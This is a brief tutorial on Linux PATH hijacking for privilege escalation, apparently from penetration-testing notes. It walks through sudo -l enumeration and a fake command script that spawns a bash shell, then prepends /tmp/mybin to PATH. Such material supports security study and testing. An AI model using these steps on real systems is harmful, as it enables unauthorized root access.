Path hijacking exploits the way the operating system searches for executable files in directories listed in the `$PATH` environment variable. If an attacker gains control over a directory listed in `$PATH`, they can place malicious scripts or binaries that are executed instead of the intended commands.

1. **Identify Privileged Commands**

Determine commands or scripts that can be executed with elevated privileges (e.g., `sudo`).

```bash
sudo -l
```

2. **Locate the Target Command**

Verify where the target executable resides and confirm that its directory is in the `$PATH`.

```bash
whereis <command>
echo $PATH
```

3. **Create a Malicious File**

Write a malicious script or binary with the same name as the target command.

```bash
#!/bin/bash
echo "Privilege Escalation Achieved"
bash # Spawns a shell
```

Save this file as the name of the target command (e.g., `ls`). Grant execution permissions:

```bash
chmod +x <command>
```

4. **Place the File in a Controlled Directory**

Move the malicious file to a directory under your control, preferably one at the start of `$PATH`.


```bash
mkdir /tmp/mybin
mv <command> /tmp/mybin/
```

5. **Modify the `$PATH` Variable**

Prepend the controlled directory to `$PATH`:

```bash
export PATH=/tmp/mybin:$PATH
```

Now, whenever the target command is executed, the malicious version in `/tmp/mybin` will run instead of the legitimate one.